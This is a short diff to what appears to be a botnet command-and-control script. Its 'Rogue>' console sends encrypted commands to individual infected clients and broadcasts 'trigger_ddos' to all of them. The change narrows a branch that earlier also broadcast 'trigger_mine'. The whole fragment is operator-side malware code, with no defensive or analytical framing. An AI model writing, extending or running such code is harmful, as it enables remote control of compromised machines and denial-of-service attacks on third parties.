@@ -47,14 +47,14 @@ def send_command():
         cmd = input("Rogue> ")
         if cmd.lower() == "exit":
             break
-        if cmd.startswith("target"):
+        elif cmd.startswith("target"):
             _, index, *command = cmd.split()
             try:
                 index = int(index)
                 clients[index].send(encrypt_message(" ".join(command)))
             except:
                 print("[!] Invalid target index.")
-        elif cmd in ["trigger_mine", "trigger_ddos"]:
+        elif cmd.startswith("trigger_ddos"):
             for conn in clients:
                 try:
                     conn.send(encrypt_message(cmd))
